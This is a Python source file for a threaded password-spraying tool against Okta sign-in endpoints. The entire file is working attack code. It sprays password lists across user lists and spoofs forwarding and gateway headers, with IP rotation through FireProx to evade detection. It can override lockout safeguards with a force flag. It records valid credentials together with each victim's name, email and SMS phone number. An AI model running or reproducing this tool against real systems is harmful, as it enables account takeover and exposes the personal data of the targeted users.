import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import random
import queue

q = queue.Queue()
force = False
lockout_counter = 0
lockedout = False
useragents = []
username_counter = 0
username_count = 0
results = ""

def main():

    global force, username_count, useragents

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
    parser.add_argument("-p", "--password", help="A single password that will be used to perform the password spray")
    parser.add_argument("-pf", "--passwordfile", help="File containing multiple passwords to spray, will spray one after they other if no delay is set")
    parser.add_argument("-a", "--useragentfile", metavar="FILE", required=False, help="File containing a list of useragents for random selection")
    parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use. Will make throttle quicker if not used with FireProx")
    parser.add_argument("-d", "--delay", type=int, help="Number of minutes to wait between unique passwords, allows password lockout policy to reset")
    parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
    parser.add_argument("--url", required=True, help="The URL to spray against 'https://target.okta.com'. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
    args = parser.parse_args()

    url = args.url
    force = args.force
    out = args.out
    threads = args.threads
    delay = args.delay

    usernames = []
    with open(args.userlist, 'r') as userlist:
        usernames = userlist.read().splitlines()

    username_count = len(usernames)

    useragents = ["test useragent"]
    if args.useragentfile is not None:
        with open(args.useragentfile, 'r') as agentlist:
            useragents = agentlist.read().splitlines()

    if not args.password == None:
        passwords = [args.password]
    elif not args.passwordfile == None:
        passwords = open(args.passwordfile,'r').read().splitlines()
    else:
        print("Either password or passwordfile flag required")
        exit()

    print(f"There are {username_count} users in total to spray,")
    print(f"Now spraying {url}.")
    print(f"Current date and time: {time.ctime()}")

    for password in passwords:

        for user in usernames:
            cred = {}
            cred['username'] = user
            cred['password'] = password
            q.put(cred)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(0,threads):
                executor.submit(
                    spray_thread,
                    url=url
                )

        if lockedout:
            print("WARNING! Lockout counter limit met, exiting spray. To force continuation, use the -f/--force flag")
            break

        if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
            continue
        else:
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(f"Completed password {password} at {current_time}, sleeping for {delay} minutes before next password spray")
            time.sleep(delay * 60)

    if out and results != "":
        with open(out, 'w') as out_file:
            out_file.write(results)
            print(f"Results have been written to {out}.")

def spray_thread(url):

    global username_counter, username_count, lockedout

    while not q.empty():

        if (force == False and lockout_counter >= 10) or lockedout:
            lockedout = True
            break

        username_counter = username_counter + 1
        print(f"{username_counter} of {username_count} users tested", end="\r")

        cred = q.get_nowait()

        okta_authenticate(
            username = cred['username'],
            password = cred['password'],
            url = url
        )

        q.task_done()


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def okta_authenticate(username, password, url):

    global results, lockout_counter, useragents

    body = {
        "username":username,
        "options": {
            "warnBeforePasswordExpired":True,
            "multiOptionalFactorEnroll":True
        },
        "password":password
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    headers = {
        "Accept":"application/json",
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-Amzn-Trace-Id" : trace_id,
        "X-Requested-With":"XMLHttpRequest",
        "X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"en",
        "Content-Type":"application/json"
    }

    if useragents != []:
        headers['User-Agent'] = random.choice(useragents)

    response = requests.post("{}/api/v1/authn".format(url), data=body, headers=headers)

    if response.status_code == 200 and 'status' in response.json():
        jsonData = response.json()

        if "LOCKED_OUT" == jsonData['status']:
            print(f"Account locked out! {username}:{password}")
            lockout_counter += 1

        elif "MFA_ENROLL" == jsonData['status']:

            print(f"Code: {response.status_code} Valid Credentials without MFA!{username}:{password}")

            email = jsonData['_embedded']['user']['profile']['login']
            fName = jsonData['_embedded']['user']['profile']['firstName']
            lName = jsonData['_embedded']['user']['profile']['lastName']
            phone = "N/A"

            if 'factors' in jsonData['_embedded']:
                for item in jsonData['_embedded']['factors']:
                    if "factorType" in item.keys() and item['factorType']=='sms':
                        phone = item['profile']['phoneNumber']
            data = ", ".join([username, password,email, fName, lName, phone])
            print(data)
            results += data

        else:

            print(f"Code: {response.status_code} Valid Credentials! {username}:{password}")

            email = jsonData['_embedded']['user']['profile']['login']
            fName = jsonData['_embedded']['user']['profile']['firstName']
            lName = jsonData['_embedded']['user']['profile']['lastName']
            phone = "N/A"

            if 'factors' in jsonData['_embedded']:

                for item in jsonData['_embedded']['factors']:
                    if "factorType" in item.keys() and item['factorType']=='sms':
                        phone = item['profile']['phoneNumber']
            data = ", ".join([username, password,email, fName, lName, phone])
            results += data
    else:
        print(f"FAILED: Code: {response.status_code} {username}:{password}")

if __name__ == '__main__':
    main()
